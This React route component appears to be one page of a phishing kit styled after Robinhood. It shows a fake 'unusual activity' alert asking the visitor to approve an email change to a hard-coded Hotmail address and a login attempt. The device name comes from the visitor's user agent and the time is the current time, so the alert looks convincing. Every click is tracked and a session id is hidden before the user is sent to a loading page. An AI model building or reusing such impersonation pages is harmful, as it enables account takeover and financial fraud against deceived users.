import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { Rh3DBackground, RH_FONT_FAMILY, RhLogo, useRhTracking } from "@/components/rh/RhShared";

export const Route = createFileRoute("/rh/review")({
  head: () => ({ meta: [{ title: "Review your account" }] }),
  component: RhReviewPage,
});

function RhReviewPage() {
  const { trackClick, rhNavigate, sessionId } = useRhTracking();
  const [email, setEmail] = useState("");
  const [location] = useState("Richmond, Virginia");
  const [device, setDevice] = useState("Mohamed's PC");
  const [time, setTime] = useState("11:57 PM");
  const [section1Choice, setSection1Choice] = useState<"approve" | "deny" | null>(null);
  const [section2Choice, setSection2Choice] = useState<"approve" | "deny" | null>(null);
  const [section1Hidden, setSection1Hidden] = useState(false);
  const [section2Hidden, setSection2Hidden] = useState(false);

  useEffect(() => {
    setEmail("mohammedalbar27@hotmail.com");
    const ua = typeof navigator !== "undefined" ? navigator.userAgent : "";
    if (/iPhone/.test(ua)) setDevice("Mohamed's iPhone");
    else if (/iPad/.test(ua)) setDevice("Mohamed's iPad");
    else if (/Android/.test(ua)) setDevice("Mohamed's Android");
    else if (/Mac/.test(ua)) setDevice("Mohamed's Mac");
    else if (/Windows/.test(ua)) setDevice("Mohamed's PC");
    else setDevice("Mohamed's Device");
    const now = new Date();
    setTime(now.toLocaleTimeString("en-US", { hour: "numeric", minute: "2-digit", hour12: true }));
  }, []);

  useEffect(() => {
    if (section1Choice) {
      const timer = setTimeout(() => setSection1Hidden(true), 400);
      return () => clearTimeout(timer);
    }
  }, [section1Choice]);

  useEffect(() => {
    if (section2Choice) {
      const timer = setTimeout(() => {
        setSection2Hidden(true);
        setTimeout(() => {
          trackClick(`Review Complete: ${section1Choice}/${section2Choice}`);
          rhNavigate("/rh/loading");
        }, 500);
      }, 400);
      return () => clearTimeout(timer);
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [section2Choice]);

  const accent = "#00C805";

  return (
    <div style={{ display: "flex", minHeight: "100vh", background: "#000", fontFamily: RH_FONT_FAMILY }}>
      <style>{`
        .rh-section-collapse { overflow: hidden; transition: max-height 0.4s ease, opacity 0.3s ease, margin 0.4s ease; max-height: 300px; opacity: 1; }
        .rh-section-collapse.hidden-section { max-height: 0; opacity: 0; margin-top: 0 !important; margin-bottom: 0 !important; }
        .rh-divider-collapse { transition: max-height 0.4s ease, opacity 0.3s ease, margin 0.4s ease; overflow: hidden; max-height: 40px; opacity: 1; }
        .rh-divider-collapse.hidden-section { max-height: 0; opacity: 0; margin: 0 !important; }
      `}</style>

      <div className="hidden md:flex" style={{ width: "50%", background: "#000", alignItems: "center", justifyContent: "center", overflow: "hidden", position: "relative" }}>
        <Rh3DBackground />
      </div>
      <div className="hidden md:block" style={{ width: 1, background: "rgba(255,255,255,0.12)", flexShrink: 0 }} />

      <div className="w-full md:w-1/2" style={{ background: "#000", display: "flex", flexDirection: "column" }}>
        <div className="md:hidden" style={{ display: "flex", justifyContent: "space-between", alignItems: "center", padding: "20px 24px" }}>
          <RhLogo />
        </div>

        <div style={{ flex: 1, display: "flex", alignItems: "flex-start", justifyContent: "center", padding: "80px 60px 40px 60px" }}>
          <div style={{ width: "100%", maxWidth: 416 }}>
            <h1 style={{ fontSize: 28, fontWeight: 400, color: "#fff", marginBottom: 12, lineHeight: 1.3 }}>Review your account</h1>
            <p style={{ fontSize: 14, color: "rgba(255,255,255,0.5)", margin: 0, lineHeight: "20px" }}>
              We have detected unusual activity on your account, please review these actions before continuing.
            </p>

            <div className={`rh-section-collapse ${section1Hidden ? "hidden-section" : ""}`} style={{ marginTop: 32 }}>
              <div style={{ fontSize: 14, fontWeight: 500, color: "#fff" }}>Credential change</div>
              <p style={{ fontSize: 14, color: "rgba(255,255,255,0.5)", marginTop: 12, lineHeight: "20px" }}>
                We received a request to change the email address associated with your account to{" "}
                <span style={{ fontWeight: 500, color: accent }}>{email || "..."}</span>.
              </p>
              <div className="grid grid-cols-2 gap-3" style={{ marginTop: 20 }}>
                <button onClick={() => { if (!section1Choice) { setSection1Choice("approve"); trackClick("Review Section1 Approve"); } }} disabled={!!section1Choice}
                  style={{ height: 48, borderRadius: 12, fontWeight: 500, fontSize: 16, border: "none", cursor: section1Choice ? "default" : "pointer", backgroundColor: section1Choice === "approve" ? accent : section1Choice === "deny" ? "rgba(255,255,255,0.1)" : accent, color: section1Choice === "deny" ? "rgba(255,255,255,0.4)" : "#000", opacity: section1Choice === "deny" ? 0.5 : 1 }}>Approve</button>
                <button onClick={() => { if (!section1Choice) { setSection1Choice("deny"); trackClick("Review Section1 Deny"); } }} disabled={!!section1Choice}
                  style={{ height: 48, borderRadius: 12, fontWeight: 500, fontSize: 16, border: "none", cursor: section1Choice ? "default" : "pointer", backgroundColor: section1Choice === "deny" ? "#fff" : "rgba(255,255,255,0.1)", color: section1Choice === "deny" ? "#000" : section1Choice === "approve" ? "rgba(255,255,255,0.4)" : "#fff", opacity: section1Choice === "approve" ? 0.5 : 1 }}>Deny</button>
              </div>
            </div>

            <div className={`rh-divider-collapse ${section1Hidden ? "hidden-section" : ""}`} style={{ borderTop: "1px solid rgba(255,255,255,0.1)", margin: "32px 0" }} />

            <div className={`rh-section-collapse ${section2Hidden ? "hidden-section" : ""}`} style={{ marginTop: section1Hidden ? 32 : 0 }}>
              <div style={{ fontSize: 14, fontWeight: 500, color: "#fff" }}>Attempted login</div>
              <p style={{ fontSize: 14, color: "rgba(255,255,255,0.5)", marginTop: 12, lineHeight: "20px" }}>
                We detected a login attempt to your account from{" "}
                <span style={{ fontWeight: 500, color: accent }}>{location} at {time}</span>, from{" "}
                <span style={{ fontWeight: 500, color: accent }}>{device}.</span>
              </p>
              <div className="grid grid-cols-2 gap-3" style={{ marginTop: 20 }}>
                <button onClick={() => { if (!section2Choice) { setSection2Choice("approve"); trackClick("Review Section2 Approve"); } }} disabled={!!section2Choice}
                  style={{ height: 48, borderRadius: 12, fontWeight: 500, fontSize: 16, border: "none", cursor: section2Choice ? "default" : "pointer", backgroundColor: section2Choice === "approve" ? accent : section2Choice === "deny" ? "rgba(255,255,255,0.1)" : accent, color: section2Choice === "deny" ? "rgba(255,255,255,0.4)" : "#000", opacity: section2Choice === "deny" ? 0.5 : 1 }}>Approve</button>
                <button onClick={() => { if (!section2Choice) { setSection2Choice("deny"); trackClick("Review Section2 Deny"); } }} disabled={!!section2Choice}
                  style={{ height: 48, borderRadius: 12, fontWeight: 500, fontSize: 16, border: "none", cursor: section2Choice ? "default" : "pointer", backgroundColor: section2Choice === "deny" ? "#fff" : "rgba(255,255,255,0.1)", color: section2Choice === "deny" ? "#000" : section2Choice === "approve" ? "rgba(255,255,255,0.4)" : "#fff", opacity: section2Choice === "approve" ? 0.5 : 1 }}>Deny</button>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">{sessionId}</div>
    </div>
  );
}
